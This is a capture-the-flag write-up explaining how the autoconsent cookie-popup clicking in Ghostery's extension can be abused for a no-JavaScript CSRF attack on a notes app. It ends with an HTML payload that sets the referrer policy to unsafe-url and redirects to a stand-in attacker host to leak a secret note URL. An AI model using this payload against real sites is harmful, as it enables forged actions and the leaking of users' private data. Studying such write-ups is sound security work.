# Writeup for notes by hmmm

Ghostery has a feature called [Never-Consent](https://www.ghostery.com/blog/never-consent-by-ghostery), which is intended to automatically click on GDPR cookie popups. If you dig into the source code, you'll [find](https://github.com/ghostery/ghostery-extension/blob/main/extension-manifest-v2/app/content-scripts/autoconsent.js) that this is implemented using [duckduckgo/autoconsent](https://github.com/duckduckgo/autoconsent/). Essentially, what the autoconsent mechanism does is that it clicks on specific HTML elements if it detects the presence of another HTML element. The rules for this can be found [here](https://github.com/duckduckgo/autoconsent/blob/main/rules/autoconsent/cookie-script.json).

We can abuse this by creating a note with elements with specific ids to cause the admin to automatically click on the submit button for a form, which allows us to perform a CSRF attack without JS. We can use this to create a note with the flag along with HTML content of our choosing.

Since the URL of the created note is random, we need to find a way to leak it. We can do this by redirecting to an attacker-controlled website with a meta refresh, so the URL is leaked through the `Referer` header. Unfortunately, if you try this, the `Referer` header only contains the domain of the target website. Why is this the case? The [`Referrer-Policy`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy) now defaults to `strict-origin-when-cross-origin`, which means that only same-origin requests will be sent the full path in the `Referer` header.

However, we can override the `Referrer-Policy` with a [meta tag of our own](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta/name#standard_metadata_names_defined_in_the_html_specification). By setting the referrer policy to `unsafe-url`, the entire path will be sent even for cross-origin requests, allowing us to leak the URL of the note with the flag.

Our final payload is:

```html
<form action="/" method="POST" id="cookiescript_injected">
	<input
		name="note"
		value='<meta name="referrer" content="unsafe-url"><meta http-equiv="refresh" content="0; url=https://attacker-site.example">'
	/>
	<input type="submit" id="cookiescript_reject" />
</form>
```
